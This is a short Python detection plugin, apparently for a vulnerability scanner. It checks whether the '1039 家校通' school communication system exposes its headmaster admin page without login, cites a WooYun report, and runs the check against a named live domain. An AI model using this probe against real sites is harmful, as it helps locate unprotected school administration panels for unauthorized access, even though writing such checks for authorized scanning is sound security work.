#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:wonderkun
#Name:1039 家校通未授权访问2处

#Refer: http://www.wooyun.org/bugs/wooyun-2010-0132856

"""
  headmaster/Index.aspx
"""
#Data:2016/1/7


def  assign(service,arg):
    if service=="1039_jxt":
        return  True,arg

def audit(arg):
    payload='headmaster/Index.aspx'
    code,head,res,errcode,finalurl=curl.curl2(arg+payload)
    if code==200 and  '<a href="ShengQingPS.aspx"' in res and '<a href="LiuShuiZhang.aspx"' in res:
        security_note("Unauthorized access"+arg+payload)

if __name__=="__main__":
    from dummy import *
    audit(assign('1039_jxt','http://lkhtjx.com/')[1])